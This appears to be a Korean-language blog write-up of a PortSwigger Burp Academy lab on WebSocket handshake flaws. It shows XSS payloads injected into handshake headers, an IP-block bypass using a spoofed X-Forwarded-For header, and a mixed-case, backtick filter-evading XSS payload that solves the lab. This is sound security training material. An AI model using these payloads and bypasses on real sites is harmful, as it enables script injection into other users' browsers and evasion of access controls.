---
layout: post
title: "Burp Academy-WebSocket 두번째 문제: Manipulating the WebSocket handshake to exploit vulnerabilities"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, WebSocket취약점]
toc: true
---

# 개요
- Manipulating the WebSocket handshake to exploit vulnerabilities
- WebSocket 취약점 설명 주소: https://portswigger.net/web-security/websockets
- 문제 주소: https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities
- 난이도: PRACTITIONER (중간)

# 취약점 설명
핸드셰이크 부분에 취약점이 있는 경우도 있다. 주로 설계 상 오류때문에 발생하는데 다음과 같은 경우이다. 
- `X-Forwarded-For` 과 같은 헤더를 보안상의 결정용으로 사용한다. 
- 세션 처리의 결함 (WebSocket 메시지가 처리되는 세션 컨텍스트는 핸드셰이크 메시지의 세션 컨텍스트에 의해 결정된다)
- 어플리케이션이 사용하는 커스텀 HTTP헤더로 인해 만들어진 공격 표면

```
Some WebSockets vulnerabilities can only be found and exploited by manipulating the WebSocket handshake. These vulnerabilities tend to involve design flaws, such as:

- Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.
```

# 랩 설명
```
This online shop has a live chat feature implemented using WebSockets.

It has an aggressive but flawed XSS filter.

To solve the lab, use a WebSocket message to trigger an alert() popup in the support agent's browser.
```

- 이전문제와 마찬가지로 온라인 숍에 웹 소캣 채킹기능이 있다. XSS 필터가 구현되어 있지만 결함이 있다. 웹 소켓 메세지를 잘 이용해서 alert창을 띄우면 문제가 풀린다. 


# 풀이
## WebSocket 핸드셰이크하는 부분 찾기 
일단 웹 소켓 핸드셰이크 부분에 결함이 있다는 것은 이미 알고있다. 그렇다면 웹 소켓 핸드셰이크는 어떤 모양인가? Burp Suite에서 봤을 때 어떻게 보이나?

Burp Proxy 메뉴의 Websocket history 탭에서 보이는 READY 메세지가 그럴 듯해 보인다. 이 것을 Repeater로 보내서 메세지를 바꿔본다 .

![READY 메세지변조](/images/burp-academy-websocket-2-1.png)

서버로부터 아무런 응답이 없다. READY를 변조하는 것은 아닌 것 같다.    

잘 생각해보면 핸드셰이크는 websocket 커넥션이 만들어진 이전에 수행될 것이다. 

Burp Proxy 메뉴의 HTTP history 탭에서 보면 websocket 커넥션이 만들어지기 전에 다음과 같은 특정 요청을 보내는 것을 확인할 수 있다. 이 부분이 websocket커넥션 생성을 요청하는 부분일 것이다. 상상하건대 이 HTTP 요청에서 XSS 공격이 가능한 포인트가 있을 것 같다. 

```http
GET /chat HTTP/2
Host: 0ad500380358cb988208ddd0001e00a2.web-security-academy.net
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Upgrade: websocket
Origin: https://0ad500380358cb988208ddd0001e00a2.web-security-academy.net
Sec-Websocket-Version: 13
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Cookie: session=wJtI9TEfcLzJQcX01CYLY0dYF6VpU8W2
Sec-Websocket-Key: 4/fCpzTZOrLBhsAFpPWgpg==


```

서버는 다음과 같은 응답을 반환한다. 
```http
HTTP/1.1 101 Switching Protocol
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: aZemjMqaEEqsVQfQhcXSz3yv7WA=
Content-Length: 0


```

## WebSocket 핸드셰이크 요청에서 XSS공격 가능한 포인트 찾기 
일단 가장 먼저 그럴듯해보이는 부분은 `Sec-Websocket-Key`헤더다. HTML페이지를 리로딩하면 다시 websocket커넥션 요청이 전송된다. 이 요청을 캡쳐해서 값이 변조해서 테스트해본다. 

```http
GET /chat HTTP/2
Host: 0ad500380358cb988208ddd0001e00a2.web-security-academy.net
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Upgrade: websocket
Origin: https://0ad500380358cb988208ddd0001e00a2.web-security-academy.net
Sec-Websocket-Version: 13
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Cookie: session=wJtI9TEfcLzJQcX01CYLY0dYF6VpU8W2
Sec-Websocket-Key: tPPVs1JZs/AEcPCnDRIbfA==<img src=1 onerror='alert(1)'>


```

400 Bad Request 응답이 돌아왔다. 
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 16

"Protocol error"
```

다음은 `Sec-Websocket-Version`헤더를 테스트해본다. 
```http
GET /academyLabHeader HTTP/2
Host: 0ad500380358cb988208ddd0001e00a2.web-security-academy.net
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Upgrade: websocket
Origin: https://0ad500380358cb988208ddd0001e00a2.web-security-academy.net
Sec-Websocket-Version: 13<img src=1 onerror='alert(1)'>
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
Cookie: session=wJtI9TEfcLzJQcX01CYLY0dYF6VpU8W2
Sec-Websocket-Key: /bUTLhvY2L2S2gQYr1hwxw==

```

이번에도 400 Bad Request 응답이 돌아왔다. 
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 16

"Protocol error"
```

거기에다 몇 번더 이것저것 테스트해보니 주소가 블락되었다는 메세지가 표시되었다. 

![address blocked](/images/burp-academy-websocket-2-2.png)

음.. 잘 모르겠다. 문제 힌트를 봐본다. 다음과 같이 되어 있다. 

```
If you're struggling to bypass the XSS filter, try out our XSS labs.
Sometimes you can bypass IP-based restrictions using HTTP headers like X-Forwarded-For.
```

`X-Forwarded-For`로 IP주소 제한을 우회할 수 있다고 한다. 아마 내 IP주소에 제한이 걸린 것 같으므로 이 것을 써보자. 다음과 같이 `X-Forwarded-For: 127.0.0.1`를 추가했다. 

```http
GET /chat HTTP/2
Host: 0ad500380358cb988208ddd0001e00a2.web-security-academy.net
Cookie: session=HsOu21B0a0cWZGpGn636upnuRpZGSwSi
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="111", "Not(A:Brand";v="8", "Chromium";v="111"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad500380358cb988208ddd0001e00a2.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7
X-Forwarded-For: 127.0.0.1


```

그러자 다시 200 응답이 돌아왔다! 이 것으로 IP주소 제한을 우회하는 방법은 알아냈다. 

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3035

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>Manipulating the WebSocket handshake to exploit vulnerabilities</title>
        
(이하생략)
```

그런데 WebSocket 핸드셰이크 요청에서는 특별히 변조하지도 않았는데 계속 400 응답이다. 모르겠다. 정답을 봤다. 

## WbSocket Reconnect 
WebSocket을 다시 연결하기 위해서 Repeater의 Reconnect기능을 이용하면 되었다. 

![Burp Repeater WebSocket Reconnect](/images/burp-academy-websocket-2-4.png)

재연결하려 하면 다음과 같이 재연결 요청 창이 나타난다. 여기에서 `X-Forwarded-For: 127.0.0.1`과 같은 우회용 헤더를 추가하면 Burp Repeater가 헤더가 추가된 요청의 세션에 대해 WebSocket 커넥션을 생성해준다. (이 기능은 Burp Proxy에서는 되지 않는 것 같다.)

![Burp Repeater WebSocket Reconnect](/images/burp-academy-websocket-2-3.png)

## XXS 필터 우회용 페이로드로 테스트 
XSS 필터를 우회하기 위한 다음 페이로드를 테스트한다. onerror부분이 대소문자가 섞여있고, alert(1)도 alert\`1\`로 되어있다. 

```json
<img src=1 oNeRrOr=alert`1`>
```

이 요청을 보내고 웹 페이지를 리로드하면 (리로드할때의 요청에도 `X-Forwarded-For: 127.0.0.1` 를 붙여야 한다.) 문제 풀이에 성공했다는 팝업이 나타난다. 

![success](/images/burp-academy-websocket-2-success.png)